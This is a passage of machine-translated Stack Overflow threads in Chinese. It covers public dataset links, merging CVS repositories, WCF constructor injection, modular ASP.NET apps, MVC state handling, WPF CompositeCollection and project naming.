*   ClueWeb09 FACC：[http ://lemurproject.org/clueweb09/FACC1/](http://lemurproject.org/clueweb09/FACC1/)
*   ClueWeb12 FACC：[http ://lemurproject.org/clueweb12/FACC1/](http://lemurproject.org/clueweb12/FACC1/)
*   Flickr 个人分类法：[http ://www.isi.edu/~lerman/downloads/flickr/flickr_taxonomies.html](http://www.isi.edu/~lerman/downloads/flickr/flickr_taxonomies.html)
*   谷歌图书 Ngram：http: [//aws.amazon.com/datasets/8172056142375670](http://aws.amazon.com/datasets/8172056142375670)
*   谷歌网络 5gram，2006 (1T)：[https ://catalog.ldc.upenn.edu/LDC2006T13](https://catalog.ldc.upenn.edu/LDC2006T13)
*   古腾堡电子书列表：[http ://www.gutenberg.org/wiki/Gutenberg:Offline_Catalogs](http://www.gutenberg.org/wiki/Gutenberg:Offline_Catalogs)
*   议事录：[http ://www.isi.edu/natural-language/download/hansard/](http://www.isi.edu/natural-language/download/hansard/)
*   机器翻译：[http ://statmt.org/wmt11/translation-task.html#download](http://statmt.org/wmt11/translation-task.html#download)
*   垃圾短信收集：[http ://www.dt.fee.unicamp.br/~tiago/smsspamcollection/](http://www.dt.fee.unicamp.br/~tiago/smsspamcollection/)
*   USENET 语料库：[http ://www.psych.ualberta.ca/~westburylab/downloads/usenetcorpus.download.html](http://www.psych.ualberta.ca/~westburylab/downloads/usenetcorpus.download.html)
*   WordNet：[http ://wordnet.princeton.edu/wordnet/download/](http://wordnet.princeton.edu/wordnet/download/)

## 图像处理

*   2GB的猫照片：http: [//bit.do/UJZZ](http://bit.do/UJZZ)
*   人脸识别基准： http: [//www.face-rec.org/databases/](http://www.face-rec.org/databases/)
*   图像网：[http ://www.image-net.org/](http://www.image-net.org/)

## 时间序列

*   时间序列数据库：[https ://datamarket.com/data/list/?q=provider:tsdl](https://datamarket.com/data/list/?q=provider:tsdl)
*   加州大学河滨分校时间序列：[http ://www.cs.ucr.edu/~eamonn/time_series_data/](http://www.cs.ucr.edu/~eamonn/time_series_data/)

## 社会科学

*   中国酒店入住/退房数据：[http ://www.360doc.com/content/13/1105/13/7863900_326788919.shtml](http://www.360doc.com/content/13/1105/13/7863900_326788919.shtml)
*   CMU 安然邮箱：[http ://www.cs.cmu.edu/~enron/](http://www.cs.cmu.edu/~enron/)
*   Facebook 社交网络（自 2007 年起）： http: [//law.di.unimi.it/datasets.php](http://law.di.unimi.it/datasets.php)
*   Facebook100 (2005): [https://archive.org/details/oxford-2005-facebook-matrix](https://archive.org/details/oxford-2005-facebook-matrix)
*   Foursquare (2010,2011): [http://www.public.asu.edu/~hgao16/dataset.html](http://www.public.asu.edu/~hgao16/dataset.html)
*   Foursquare（UMN/Sarwat，2013）：[https ://archive.org/details/201309_foursquare_dataset_umn](https://archive.org/details/201309_foursquare_dataset_umn)
*   一般社会调查 (GSS)：[http ://www3.norc.org/GSS+Website/](http://www3.norc.org/GSS+Website/)
*   GetGlue（用户评分电视节目）： http: [//getglue-data.s3.amazonaws.com/getglue_sample.tar.gz](http://getglue-data.s3.amazonaws.com/getglue_sample.tar.gz)
*   GitHub存档：[http ://www.githubarchive.org/](http://www.githubarchive.org/)
*   ICPSR： http: [//www.icpsr.umich.edu/icpsrweb/ICPSR/index.jsp](http://www.icpsr.umich.edu/icpsrweb/ICPSR/index.jsp)
*   移动社交网络 (UMASS)：[https ://kdl.cs.umass.edu/display/public/Mobile+Social+Networks](https://kdl.cs.umass.edu/display/public/Mobile+Social+Networks)
*   PewResearch 互联网项目：[http ://www.pewinternet.org/datasets/pages/2/](http://www.pewinternet.org/datasets/pages/2/)
*   社交网络：[http ://www.cs.cmu.edu/~jelsas/data/ancestry.com/](http://www.cs.cmu.edu/~jelsas/data/ancestry.com/)
*   SourceForge 图表：[http ://www.nd.edu/~oss/Data/data.html](http://www.nd.edu/~oss/Data/data.html)
*   泰坦尼克号生存数据集：[https ://github.com/caesar0301/awesome-public-datasets/blob/master/Datasets/titanic.csv.zip](https://github.com/caesar0301/awesome-public-datasets/blob/master/Datasets/titanic.csv.zip)
*   推特图：[http ://an.kaist.ac.kr/traces/WWW2010.html](http://an.kaist.ac.kr/traces/WWW2010.html)
*   加州大学伯克利分校的 D-Lab Achive：[http ://ucdata.berkeley.edu/](http://ucdata.berkeley.edu/)
*   加州大学洛杉矶分校社会科学数据档案：[http ://dataarchives.ss.ucla.edu/Home.DataPortals.htm](http://dataarchives.ss.ucla.edu/Home.DataPortals.htm)
*   UNIMI 社交网络数据集：[http ://law.di.unimi.it/datasets.php](http://law.di.unimi.it/datasets.php)
*   全球大学： http: [//univ.cc/](http://univ.cc/)
*   UPJOHN 就业研究：[http ://www.upjohn.org/erdc/erdc.html](http://www.upjohn.org/erdc/erdc.html)
*   雅虎图和社交数据：[http ://webscope.sandbox.yahoo.com/catalog.php?datatype=g](http://webscope.sandbox.yahoo.com/catalog.php?datatype=g)
*   Youtube 图表 (2007,2008): [http://netsg.cs.sfu.ca/youtubedata/](http://netsg.cs.sfu.ca/youtubedata/)

## 复杂网络

*   CrossRef DOI URL：[https ://archive.org/details/doi-urls](https://archive.org/details/doi-urls)
*   DBLP 引文数据集：[https ://kdl.cs.umass.edu/display/public/DBLP](https://kdl.cs.umass.edu/display/public/DBLP)
*   NBER 专利引用： http: [//nber.org/patents/](http://nber.org/patents/)
*   NIST 复杂网络数据收集： http: [//math.nist.gov/~RPozo/complex_datasets.html](http://math.nist.gov/~RPozo/complex_datasets.html)
*   蛋白质-蛋白质相互作用网络：http: [//vlado.fmf.uni-lj.si/pub/networks/data/bio/Yeast/Yeast.htm](http://vlado.fmf.uni-lj.si/pub/networks/data/bio/Yeast/Yeast.htm)
*   PyPI 和 Maven 依赖网络： http: [//ogirardot.wordpress.com/2013/01/31/sharing-pypimaven-dependency-data/](http://ogirardot.wordpress.com/2013/01/31/sharing-pypimaven-dependency-data/)
*   Scopus 引文数据库：[http ://www.elsevier.com/online-tools/scopus](http://www.elsevier.com/online-tools/scopus)
*   斯坦福 GraphBase (Steven Skiena)：[http ://www3.cs.stonybrook.edu/~algorith/implement/graphbase/implement.shtml](http://www3.cs.stonybrook.edu/~algorith/implement/graphbase/implement.shtml)
*   斯坦福大型网络数据集集合：[http ://snap.stanford.edu/data/](http://snap.stanford.edu/data/)
*   科布伦茨网络收藏： http: [//konect.uni-koblenz.de/](http://konect.uni-koblenz.de/)
*   UCI 网络数据存储库： http: [//networkdata.ics.uci.edu/resources.php](http://networkdata.ics.uci.edu/resources.php)
*   UFL 稀疏矩阵集合：[http ://www.cise.ufl.edu/research/sparse/matrices/](http://www.cise.ufl.edu/research/sparse/matrices/)
*   UNIMI 大型网络图：ht​​tp: [//law.di.unimi.it/datasets.php](http://law.di.unimi.it/datasets.php)
*   WSU 图形数据库：[http ://www.eecs.wsu.edu/mgd/gdb.html](http://www.eecs.wsu.edu/mgd/gdb.html)

## 计算机网络

*   3.5B 网页： http: [//www.bigdatanews.com/profiles/blogs/big-data-set-3-5-billion-web-pages-made-available-for-all-of-us](http://www.bigdatanews.com/profiles/blogs/big-data-set-3-5-billion-web-pages-made-available-for-all-of-us)
*   53.5B 网络点击：[http ://cnets.indiana.edu/groups/nan/webtraffic/click-dataset](http://cnets.indiana.edu/groups/nan/webtraffic/click-dataset)
*   CAIDA 互联网数据集： http: [//www.caida.org/data/overview/](http://www.caida.org/data/overview/)
*   ClueWeb09：[http ://lemurproject.org/clueweb09/](http://lemurproject.org/clueweb09/)
*   ClueWeb12：[http ://lemurproject.org/clueweb12/](http://lemurproject.org/clueweb12/)
*   CommonCrawl 网络数据：[http ://commoncrawl.org/the-data/get-started/](http://commoncrawl.org/the-data/get-started/)
*   达特茅斯 CRAWDAD 无线数据集：[http ://crawdad.cs.dartmouth.edu/](http://crawdad.cs.dartmouth.edu/)
*   OpenMobileData (MobiPerf)：[https ://console.developers.google.com/storage/openmobiledata_public/](https://console.developers.google.com/storage/openmobiledata_public/)
*   UCSD 网络望远镜： http: [//www.caida.org/projects/network_telescope/](http://www.caida.org/projects/network_telescope/)

## 数据 SE

*   学术洪流：[http ://academictorrents.com/](http://academictorrents.com/)
*   Datahub.io：http://datahub.io/dataset [_](http://datahub.io/dataset)
*   [数据市场： https](https://datamarket.com/data/list/?q=all) ://datamarket.com/data/list/ ?q=all
*   哈佛数据宇宙：http: [//thedata.harvard.edu/dvn/](http://thedata.harvard.edu/dvn/)
*   Statista： http: [//www.statista.com/](http://www.statista.com/)
*   自由基地：[http ://www.freebase.com/](http://www.freebase.com/)

## 公共领域

*   亚马逊：[http ://aws.amazon.com/datasets](http://aws.amazon.com/datasets)
*   Archive.org 数据集：[https ://archive.org/details/datasets](https://archive.org/details/datasets)
*   CMU JASA 数据存档： http: [//lib.stat.cmu.edu/jasadata/](http://lib.stat.cmu.edu/jasadata/)
*   CMU StatLab 集合：[http ://lib.stat.cmu.edu/datasets/](http://lib.stat.cmu.edu/datasets/)
*   数据360：[http ://www.data360.org/index.aspx](http://www.data360.org/index.aspx)
*   Datamob.org：http://datamob.org/datasets [_](http://datamob.org/datasets)
*   谷歌：[http ://www.google.com/publicdata/directory](http://www.google.com/publicdata/directory)
*   信息黑猩猩：http: [//www.infochimps.com/](http://www.infochimps.com/)
*   KDNuggets 数据集：[http ://www.kdnuggets.com/datasets/index.html](http://www.kdnuggets.com/datasets/index.html)
*   [数字： http](http://numbrary.com/) ://numbrary.com/
*   革命分析集合：[http ://www.revolutionanalytics.com/subscriptions/datasets/](http://www.revolutionanalytics.com/subscriptions/datasets/)
*   示例 R 数据集：[http ://stat.ethz.ch/R-manual/R-patched/library/datasets/html/00Index.html](http://stat.ethz.ch/R-manual/R-patched/library/datasets/html/00Index.html)
*   Stats4Stem R 数据集： http: [//www.stats4stem.org/data-sets.html](http://www.stats4stem.org/data-sets.html)
*   StatSci.org：http://www.statsci.org/datasets.html [_](http://www.statsci.org/datasets.html)
*   华盛顿邮报名单：[http ://www.washingtonpost.com/wp-srv/metro/data/datapost.html](http://www.washingtonpost.com/wp-srv/metro/data/datapost.html)
*   加州大学洛杉矶分校 SOCR 数据收集：[http ://wiki.stat.ucla.edu/socr/index.php/SOCR_Data](http://wiki.stat.ucla.edu/socr/index.php/SOCR_Data)
*   不明飞行物报告：[http ://www.nuforc.org/webreports.html](http://www.nuforc.org/webreports.html)
*   维基解密 911 寻呼机拦截：http: [//911.wikileaks.org/files/index.html](http://911.wikileaks.org/files/index.html)
*   雅虎 Webscope：[http ://webscope.sandbox.yahoo.com/catalog.php](http://webscope.sandbox.yahoo.com/catalog.php)

## 补充收藏

*   数据争吵：[http ://www.datawrangling.com/some-datasets-available-on-the-web](http://www.datawrangling.com/some-datasets-available-on-the-web)
*   Inside-r： http: [//www.inside-r.org/howto/finding-data-internet](http://www.inside-r.org/howto/finding-data-internet)
*   知乎：[http ://www.quora.com/Where-can-I-find-large-datasets-open-to-the-public](http://www.quora.com/Where-can-I-find-large-datasets-open-to-the-public)
*   RS 收藏 100+：[http ://rs.io/2014/05/29/list-of-data-sets.html](http://rs.io/2014/05/29/list-of-data-sets.html)
*   StaTrek：[http ://hsiamin.com/posts/2014/10/23/leveraging-open-data-to-understand-urban-lives/](http://hsiamin.com/posts/2014/10/23/leveraging-open-data-to-understand-urban-lives/)

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2012-04-24T21:46:17.167

这里有几个。玩得开心。

[http://archive.ics.uci.edu/ml/](http://archive.ics.uci.edu/ml/)

[http://aws.amazon.com/datasets?_encoding=UTF8&jiveRedirect=1](http://aws.amazon.com/datasets?_encoding=UTF8&jiveRedirect=1)

[http://crawdad.org/](http://crawdad.org/)

[http://data.austintexas.gov](http://data.austintexas.gov)

[http://data.cityofchicago.org](http://data.cityofchicago.org)

[http://data.govloop.com](http://data.govloop.com)

[http://data.gov.uk/](http://data.gov.uk/)

[http://data.medicare.gov](http://data.medicare.gov)

[http://data.seattle.gov](http://data.seattle.gov)

[http://data.sfgov.org](http://data.sfgov.org)

[http://data.sunlightlabs.com](http://data.sunlightlabs.com)

[https://datamarket.azure.com/](https://datamarket.azure.com/)

[http://ftp.ncbi.nih.gov/](http://ftp.ncbi.nih.gov/)

[http://gettingpastgo.socrata.com](http://gettingpastgo.socrata.com)

[http://books.google.com/ngrams/](http://books.google.com/ngrams/)

[http://linkeddata.org/](http://linkeddata.org/)

[http://medihal.archives-ouvertes.fr](http://medihal.archives-ouvertes.fr)

[http://public.resource.org/](http://public.resource.org/)

[http://rechercheisidore.fr](http://rechercheisidore.fr)

[http://reddit.com/r/datasets](http://reddit.com/r/datasets)

[http://timetric.com/public-data/](http://timetric.com/public-data/)

[http://www2.jpl.nasa.gov/srtm](http://www2.jpl.nasa.gov/srtm)

[http://www.bls.gov/](http://www.bls.gov/)

[http://www.crunchbase.com/](http://www.crunchbase.com/)

[http://www.dartmouthatlas.org/](http://www.dartmouthatlas.org/)

[http://www.data.gov/](http://www.data.gov/)

[http://www.datakc.org](http://www.datakc.org)

[http://www.factual.com/](http://www.factual.com/)

[http://www.freebase.com/](http://www.freebase.com/)

[http://www.infochimps.com](http://www.infochimps.com)

[http://www.kaggle.com/](http://www.kaggle.com/)

[http://build.kiva.org/](http://build.kiva.org/)

[http://www.imdb.com/interfaces](http://www.imdb.com/interfaces)

[http://dbpedia.org](http://dbpedia.org)

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2008-12-19T19:17:44.493

只是一个想法：

*   [USGS 地名数据库](http://gcmd.nasa.gov/records/GNIS.html)
*   [美国农业部植物清单](http://plants.usda.gov/dl_all.html)
*   许多州 GIS 存储库中的任何一个，例如 NH 的[GRANIT](http://www.granit.unh.edu/data/downloadfreedata/downloaddata.html)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-12-19T18:42:23.893

好吧，对于 Web 服务器日志，您总是可以按照您需要的格式生成它们。如果您要针对它测试代码等，则必须针对您要存储/解析的字段进行定制。

对于用于数据库性能基准测试的数据集，您可能希望查看可以为您生成数据的工具。红门有一个很棒的，钱不多。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2010-05-25T22:35:43.600

Google Fusion Tables 有一些。

[http://tables.googlelabs.com/](http://tables.googlelabs.com/)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-04-27T01:49:39.770

[这里](http://www.kdnuggets.com/datasets/index.html)也提供数据集。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2014-10-03T00:09:47.463

[http://Quandl.com](http://Quandl.com)拥有从互联网上收集的超过 1000 万个数据集。这个资源的伟大之处在于它提供了一种访问所有数据的单一方式。该站点有一个免费的 Excel 插件，或者有 R、Python、Ruby 等的库。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-04-27T18:31:00.500

Kaggle.com 经常遇到数据挖掘挑战。这些数据集涵盖了广泛的领域：从医疗保健提供者数据到信用历史信息。也许那里有你所追求的东西。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-04-27T16:24:10.847

好吧，这个是新的，背后有一个挑战：

[百万歌曲数据集挑战](http://www.kaggle.com/c/msdchallenge)

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2012-04-24T00:20:11.753

也许一些数据库用作人脸识别算法的训练集：[face-rec.org](http://www.face-rec.org/databases/)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2012-03-30T04:04:28.323

[http://www.quora.com/Data/Where-can-I-get-large-datasets-open-to-the-public](http://www.quora.com/Data/Where-can-I-get-large-datasets-open-to-the-public)

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2012-04-19T04:50:16.597

我很惊讶没有人提到 Google N-Grams。有关 N-Gram 的更多信息，请访问 [http://googleresearch.blogspot.com/2006/08/all-our-n-gram-are-belong-to-you.html](http://googleresearch.blogspot.com/2006/08/all-our-n-gram-are-belong-to-you.html)

# cvs - 将多个 CVS 项目合并为一个

> ID：381808
> 
> 赞同：3
> 
> 时间：2008-12-19T18:37:22.873
> 
> 标签：cvs

我有几个相关的 CVS 项目，我想将它们移动到单个新项目的子目录中。

假设每个使用项目的人都会在我进行更改之前删除他们的工作副本。[按照手册中的](http://ximbiot.com/cvs/manual/cvs-1.11.23/cvs_7.html#SEC74)建议，进入存储库目录并移动目录是否安全？我还需要做其他事情吗？

保留文件的历史记录非常重要，因此我不想只是删除它们并将它们重新提交到新位置。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T18:53:27.023

在 CVS 存储库中进行修改是标准做法。但是，不要移动目录，而是考虑复制它们（这称为 repocopy），然后通过正常的 CVS 命令删除其原始位置的文件。这样，即使您的更改也将被记录为历史的一部分。

不用说，在进行任何更改之前，请保留 CVS 文件的完整备份，

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T18:44:20.007

是的，这会奏效。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T19:30:11.380

是的，正如其他人所说，这将起作用，但请保留备份以防万一。此外，您可能想要调查 Subversion ( [http://subversion.tigris.org/](http://subversion.tigris.org) ) 作为 CVS 的替代品。我推迟了从 CVS 迁移到 Subversion 很长一段时间，但现在我因为没有早点这样做而责备自己。像这样的任务在 Subversion 中是微不足道的，而且由于从一开始就将 Subversion 设计为 CVS 的替代品，因此迁移真的没有那么痛苦。

# wcf - WCF 服务可以有构造函数吗？

> ID：381831
> 
> 赞同：42
> 
> 时间：2008-12-19T18:41:51.383
> 
> 标签：wcf, dependency-injection, constructor

当我在我的解决方案中新建一个 WCF 服务时，我可以执行以下操作，有一个带参数的构造函数要传入吗？如果是，运行时如何、何时以及在何处填充我所需的 IBusinessLogic 对象？

```
[ServiceContract]
public interface IServiceContract
{
    [OperationContract]
    ...
}

public class MyService : IServiceContract
{
    IBusinessLogic _businessLogic;
    public ServiceLayer(IBusinessLogic businessLogic)
    {
        _businessLogic = businessLogic;
    }
    ...
} 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-12-19T19:14:07.963

开箱即用的 WCF 将仅使用默认构造函数，您不能使用参数化构造函数。您必须做一些额外的工作才能使 WCF 调用参数化构造函数。

你可以试试这个：

> [如何将值传递给我的 wcf 服务的构造函数？](https://stackoverflow.com/questions/2454850/how-do-i-pass-values-to-the-constructor-on-my-wcf-service/2455039#2455039)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-12-19T18:45:10.317

看看[ServiceHostFactory](http://msdn.microsoft.com/en-us/library/aa702697.aspx)。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-12-30T12:32:42.790

您可以让 WCF（某种程度上间接地）调用非默认构造函数，为此您需要滚动自己的实例提供程序。您需要实现 IInstanceProvider 并添加自定义服务行为。一些链接将向您展示如何结合 Spring.NET 执行此操作：

[WCF 服务依赖注入](http://orand.blogspot.com/2006/10/wcf-service-dependency-injection.html)

[代码示例 WCF 服务依赖注入](http://roestenburg.agilesquad.com/2008/09/update-on-wcf-service-dependency.html)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-12-30T13:03:01.823

除了其他响应之外，另一种情况是创建单例服务时 - 这是您将服务实例传递给 ServiceHost（而不是类型）时；

显然，当您创建实例时，您可以使用任何构造函数；

这种方法需要向您的服务添加一个属性：[ServiceBehavior(InstanceContextMode.Single)];

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2015-10-08T11:37:21.533

我将@Mark Seemann 的解决方案解释为**通用实例提供程序行为**。

## 如何使用它：

```
var host = new ServiceHost(typeof(MyService), baseAddress);
var instanceProvider = new InstanceProviderBehavior<T>(() => new MyService(businessLogic));
instanceProvider.AddToAllContracts(host); 
```

## InstanceProviderBehavior 代码：

```
public class InstanceProviderBehavior<T> : IInstanceProvider, IContractBehavior
    where T : class
{
  private readonly Func<T> m_instanceProvider;

  public InstanceProviderBehavior(Func<T> instanceProvider)
  {
    m_instanceProvider = instanceProvider;
  }

  // I think this method is more suitable to be an extension method of ServiceHost.
  // I put it here in order to simplify the code.
  public void AddToAllContracts(ServiceHost serviceHost)
  {
    foreach (var endpoint in serviceHost.Description.Endpoints)
    {
      endpoint.Contract.Behaviors.Add(this);
    }
  }

  #region IInstanceProvider Members

  public object GetInstance(InstanceContext instanceContext, Message message)
  {
    return this.GetInstance(instanceContext);
  }

  public object GetInstance(InstanceContext instanceContext)
  {
    // Create a new instance of T
    return m_instanceProvider.Invoke();
  }

  public void ReleaseInstance(InstanceContext instanceContext, object instance)
  {
    try
    {
      var disposable = instance as IDisposable;
      if (disposable != null)
      {
        disposable.Dispose();
      }
    }
    catch { }
  }

  #endregion

  #region IContractBehavior Members

  public void AddBindingParameters(ContractDescription contractDescription, ServiceEndpoint endpoint, BindingParameterCollection bindingParameters)
  {
  }

  public void ApplyClientBehavior(ContractDescription contractDescription, ServiceEndpoint endpoint, ClientRuntime clientRuntime)
  {
  }

  public void ApplyDispatchBehavior(ContractDescription contractDescription, ServiceEndpoint endpoint, DispatchRuntime dispatchRuntime)
  {
    dispatchRuntime.InstanceProvider = this;
  }

  public void Validate(ContractDescription contractDescription, ServiceEndpoint endpoint)
  {
  }

  #endregion
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-09-07T06:39:00.450

您必须实现 IInstanceProvider 才能调用参数化服务构造函数。此构造函数在生成的代理中将不可用。

# asp.net - 拆分/模块化大型 ASP.NET Web 应用程序项目

> ID：381844
> 
> 赞同：9
> 
> 时间：2008-12-19T18:45:49.893
> 
> 标签：asp.net, web-applications

我们公司有一个相当大的 ASP.NET Web 应用程序。该应用程序已被分解为不同的业务功能“区域”。我正在寻找一些我们可以用来将此 Web 应用程序拆分为单独的可构建/可版本化模块的策略。

**主要目标是：**

使我们能够部署仅具有选定功能区域的 Web 应用程序。

我将父 Web 应用程序设想为可以托管“插件”的“外壳”，这些“插件”可以将自己注册为父 Web 应用程序导航层次结构上的菜单项。父 Web 应用程序将包含插件使用的母版页、样式表和常用控件。

你有什么样的想法来实现这样的事情？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-19T20:29:49.030

我会做子网络项目。每个网站都是父网站的子项目。您可以编写一个 HttpModule 来检查某些数据存储以查看该客户是否有权访问该站点（模块）并以这种方式拒绝访问。[Scott Guthrie 有一篇关于如何在此处](http://weblogs.asp.net/scottgu/archive/2006/08/16/tip_2f00_trick_3a00_-creating-sub_2d00_web-projects-using-the-vs-2005-web-application-project-option.aspx)设置子 Web 项目的好帖子。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-20T06:27:31.350

一种简单的方法是简单地使用站点地图。您可以分离您的 aspx 文件并编译您想要的所有不同的 dll。SiteMap 是完全独立的，可以根据您的需要进行配置，包括您想要的任何模块，以及您想要的任何权限。没有真正需要任何代码模块向其他代码模块注册自己。这是 ASP.NET，每个请求都是独立的，可以从任何 aspx 入口点开始。就您的页面而言，启用跨模块功能就像在另一个模块中提供指向页面的链接一样简单。SiteMap 可以轻松完成这项工作。

# asp.net-mvc - 在 ASP.NET MVC 中保留值

> ID：381857
> 
> 赞同：0
> 
> 时间：2008-12-19T18:51:39.087
> 
> 标签：asp.net-mvc

**背景**

我的 ASP.NET MVC Web 应用程序上有一个页面，供用户将地址输入到他们的地址簿中。当用户输入他们的地址并单击提交按钮时，处理表单发布的控制器操作然后对地址进行地理编码（检索纬度、经度和完整地址，以防用户忘记输入他们的状态、邮政编码等.)。

现在，完全有可能用户没有输入足够的信息来获得精确匹配。在这种情况下，地理编码服务会返回指定地址的最佳匹配列表。发生这种情况时，我想用这个最佳匹配列表提示用户，以便他们可以选择他们希望使用的地址。

这一切都很好。我将最佳匹配列表存储在 ViewData 中，如果提供了列表中的项目，页面会将列表中的项目呈现为无序列表。每个地址旁边都有一个“选择”链接，用户可以使用该链接来选择他们希望使用的地址。“选择”链接的“单击”事件使用 jQuery 连接，将原始地址文本框中的文本替换为用户选择的地址，然后通过 javascript 单击提交按钮。

**问题**

当用户选择一个地址时，我希望我的控制器操作来检查该地址是否已经在他们的地址簿中。如果是，那么我想返回一条错误消息，表明该地址已经存在。我还想重新呈现可能的地址列表供用户选择（例如，如果用户最初看到一个包含 3 个地址的列表，并且他们选择了一个已经在他们的地址簿中的地址，那么页面应该显示一个错误消息和要再次选择的 3 个地址）。如何重新呈现最佳匹配列表，而无需在控制器操作中再次调用地理编码服务？

换句话说，我有一个由我想再次显示给用户的最后一个控制器操作生成的无序列表。列表中的项目呈现为文本字符串，因此不会发布到我的控制器操作中。到目前为止，我能够解决这个问题的唯一方法是将地址匹配列表存储在会话中。我错过了什么，还是我应该这样做？

使用 ASP.NET Web 表单应用程序，我可以简单地将最佳匹配项存储在 ViewState 中，并且可以在用户选择地址的回发时提供给我。ASP.NET MVC 是否有类似的机制？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T19:08:55.883

您可以对控制器使用 AJAX 请求，该请求将验证地址是否已存在以及它是否仅更新页面的错误消息容器。这样，已经渲染的匹配列表将保持不变。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T19:01:44.293

为什么不在用户地址簿上过滤现有地址，然后再向他展示所有可供选择的选项？这样，用户将无法选择已经存在的地址，因为它永远不会将其视为一个选项。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T19:47:47.303

将地址存储在带有 ID 的表中。将 的 ID 存储在用户列表中。现在很容易通过检查 ID 是否存在于用户列表中来过滤列表。

# wpf - 您可以在 XAML 中向数据绑定 ItemsControl 添加额外的项目吗？

> ID：381859
> 
> 赞同：17
> 
> 时间：2008-12-19T18:52:42.547
> 
> 标签：wpf, data-binding, xaml

我有一个`ItemsControl`绑定到`decimal`s 列表的数据。我需要向`ItemsControl`（手动指定数字的选项）添加一个额外的控件。有没有办法在 XAML 中做到这一点？我知道我可以在后面的代码中手动添加该项目，但我试图更好地理解 WPF 并想看看是否有一种声明性的方式来做到这一点。

请注意，修改我绑定到的列表以使其包含额外的按钮（可能通过更改为`string`s 而不是`decimal`s 的列表）不是一个好的选择，因为我想将命令附加到最后一个按钮。

此外，在之后添加一个额外的按钮`ItemsControl`也不是一个好的选择，因为我的控件使用 a`UniformGrid`并且我希望我的额外控件在同一个网格中。

这是我的 XAML：

```
<ItemsControl ItemsSource="{Binding PossibleAmounts}">
    <ItemsControl.ItemsPanel>
        <ItemsPanelTemplate>
            <UniformGrid Name="ButtonsGrid">
            </UniformGrid>
        </ItemsPanelTemplate>
    </ItemsControl.ItemsPanel>
    <ItemsControl.ItemTemplate>
        <DataTemplate>
            <Button>
                <TextBlock Text="{Binding StringFormat='\{0:C\}'}"/>
            </Button>
        </DataTemplate>
    </ItemsControl.ItemTemplate>
</ItemsControl> 
```

基本上，我想要 UniformGrid 中的另一个按钮。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2008-12-19T20:15:06.000

您可以为此目的使用[CompositeCollection](http://msdn.microsoft.com/en-us/library/system.windows.data.compositecollection.aspx)类，它将多个集合或单个项目组合为 ItemsControl 的 ItemsSource。

MSDN文章中有一个很好的例子，或者这里是另一个：

```
<Grid xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
      xmlns:sys="clr-namespace:System;assembly=mscorlib"
      xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
    <Grid.Resources>
        <x:Array x:Key="intData" Type="{x:Type sys:Int32}">
            <sys:Int32>1</sys:Int32>
            <sys:Int32>2</sys:Int32>
            <sys:Int32>3</sys:Int32>
        </x:Array>
        <x:Array x:Key="stringData" Type="{x:Type sys:String}">
            <sys:String>Do</sys:String>
            <sys:String>Re</sys:String>
            <sys:String>Mi</sys:String>
        </x:Array>
    </Grid.Resources>
    <ListBox>
        <ListBox.ItemsSource>
            <CompositeCollection>
                <CollectionContainer Collection="{StaticResource intData}"/>
                <CollectionContainer Collection="{StaticResource stringData}"/>
                <ListBoxItem>One more item!</ListBoxItem>
                <ListBoxItem>Two more items!</ListBoxItem>
            </CompositeCollection>
        </ListBox.ItemsSource>
    </ListBox>
</Grid> 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2009-04-17T21:08:41.690

然而，CompositeCollection 的问题在于它不继承父元素 DataContext，因此您将无法编写：

```
<CollectionContainer Collection={Binding ...}" /> 
```

在里面——或者更确切地说，它会让你，但你不会从中得到任何东西。由于原始帖子要求 - {Binding PossibleAmounts} - 而不是绑定到 StaticResource - 这并不是真正的解决方案。

看：

[http://blogs.msdn.com/nickkramer/archive/2006/08/18/705116.aspx](http://blogs.msdn.com/nickkramer/archive/2006/08/18/705116.aspx)

[http://www.vistax64.com/avalon/90-compositecollections-collectioncontainer-binding-issue.html](http://www.vistax64.com/avalon/90-compositecollections-collectioncontainer-binding-issue.html)

[http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/bd1a78c1-67ef-4d1e-9cbe-70bbe8eb8b44/](http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/bd1a78c1-67ef-4d1e-9cbe-70bbe8eb8b44/)

# naming-conventions - 项目命名

> ID：381864
> 
> 赞同：2
> 
> 时间：2008-12-19T18:56:08.733
> 
> 标签：naming-conventions, namespaces, class-library

作为一名初学者/中级开发人员，我遇到了一个问题，因为我的项目变得越来越大，越来越抽象，因为我使用了更多的 OOP 原则，我在命名事物时遇到了问题。就像当我有多个项目或类库时，我不知道如何命名它们。我看到了从 xxx.Core 到 xxx.Main 的东西，甚至看到了 xxx.BLL 和 xxx.DAL。在浏览其他人时，我看到 xxx.Services 和 xxx.Data 用于他们的库和命名空间。

那么一旦解决了这个问题，我该怎么称呼 DTO？在那个领域我见过 xxx.DTO、xxx.Entities、xxx.Props。

在编码时命名库，方法，接口等有什么好的指导方针，以便越来越多的人在我之后接手项目时会理解事物。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-19T19:03:17.707

缩写通常不好。

**数据访问层**
YourCompany.Data.dll

